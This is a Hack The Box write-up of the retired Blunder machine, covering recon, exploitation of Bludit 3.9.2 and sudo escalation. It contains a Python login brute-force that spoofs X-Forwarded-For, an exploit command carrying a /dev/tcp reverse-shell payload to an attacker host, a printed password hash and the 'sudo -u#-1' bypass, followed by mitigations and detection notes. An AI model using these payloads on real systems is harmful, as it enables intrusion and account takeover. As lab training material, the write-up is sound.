---
machine: Blunder
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, bludit, cve, bruteforce, sudo]
---

# Blunder — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Bludit 3.9.2 on Apache, with no SSH or FTP. A `todo.txt` hands over the user `fergus` and the panel confirms the version. Rate limiting is bypassed with `X-Forwarded-For` (CVE-2019-17240) and a CeWL wordlist finds the password. Once logged in, image uploads allow path traversal in `uuid` (CVE-2019-16113), ending in RCE. Inside, a second Bludit install (3.10.0a) stores `hugo`'s SHA-1 hash, and a `(ALL, !root)` sudo rule falls to CVE-2019-14287 with `sudo -u#-1`.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
80/tcp  open  http  Apache httpd 2.4.41 ((Ubuntu))
```

No SSH: the whole surface is web. The HTML generator points at Bludit.

## Enumeration

```bash
gobuster dir -u http://<IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50
```

```text
/admin        (301)
/install.php  (200)  "Bludit is already installed ;)"
/todo.txt     (200)
/LICENSE      (200)
```

```text
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

User: `fergus`. `/admin/` HTML exposes `version=3.9.2`.

```bash
sudo cewl -d 3 -m 5 http://<IP>/ > cewl.txt
wc -l cewl.txt
```

## Foothold

CVE-2019-17240: lockout is keyed on the client IP, taken from `X-Forwarded-For`. Send a different value per request and the counter never grows.

```python
import requests, re

url = "http://<IP>/admin/login.php"
s = requests.Session()
r = s.get(url)
token = re.search(r'name="tokenCSRF" value="(.*?)"', r.text).group(1)
data = {"tokenCSRF": token, "username": "fergus", "password": pw}
r = s.post(url, data=data, headers={"X-Forwarded-For": pw}, allow_redirects=False)
ok = "/admin/dashboard" in r.headers.get("Location", "")
```

With `cewl.txt` this yields `fergus:<password>`.

CVE-2019-16113: uploads do not validate `uuid`, so files land outside `bl-content/uploads`, and a `.htaccess` makes Apache execute the image as PHP:

```bash
python3 48568.py -u http://<IP> -user fergus -pass '<password>' \
  -c "bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'"
```

Shell as `www-data`.

## Escalation

```bash
cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
```

```json
"admin": { "nickname": "Hugo", "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d" }
```

Unsalted SHA-1: any dictionary or CrackStation breaks it.

```bash
su hugo
```

```bash
sudo -l
# (ALL, !root) /bin/bash
```

CVE-2019-14287: on sudo < 1.8.28, UID `-1` is treated as `4294967295` and resolves to root, bypassing `!root`:

```bash
sudo -u#-1 /bin/bash
```

## Evidence

- `id` → `www-data`, `hugo`, `root`.
- `users.php` with the hash redacted.
- `user.txt` and `root.txt` read (redacted).

## Lessons learned

- `.txt` files in the web root (notes, TODOs) leak usernames and operational hints.
- CeWL beats rockyou when the CMS password comes from the site's own content.
- IP-based lockout is trivially bypassed when the IP comes from a client-controlled header.
- Two Bludit installs lived on the server: the credential was in the one that was not exploited.
- `(ALL, !root)` is not a restriction, it is a CVE on unpatched sudo.

## Mitigations and detection

- Update Bludit: the brute-force bypass (CVE-2019-17240) and the upload traversal (CVE-2019-16113) both hit 3.9.2; the login fix lands in 3.9.3 and the upload fix in 3.10.
- Do not trust `X-Forwarded-For` unless a controlled proxy rewrites it; rate-limit per account.
- Validate `uuid` and serve uploads from a non-executable directory.
- Upgrade sudo to >= 1.8.28 and avoid `(ALL, !root)` rules.
- Detection: many POSTs to `/admin/login.php` with varying `X-Forwarded-For`, `.htaccess` inside upload dirs, `sudo -u#-1`.
- MITRE: T1110.003, T1190, T1548.003.

## References

- CVE-2019-17240, CVE-2019-16113, CVE-2019-14287.
- MITRE ATT&CK: T1110.003, T1190.
